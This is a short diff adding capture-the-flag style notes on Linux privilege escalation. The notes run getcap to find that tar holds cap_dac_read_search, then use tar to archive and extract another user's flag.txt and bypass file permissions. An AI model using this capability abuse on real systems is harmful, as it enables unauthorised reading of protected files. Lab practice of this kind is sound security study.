@@ -1,0 +1,6 @@
+getcap -r /* 2>/dev/null
+	/usr/bin/tar = cap_dac_read_search+ep
+
+tar cvf flag.tar /home/user1/flag.txt
+tar xvf flag.tar
+cat ./home/user1/flag.txt
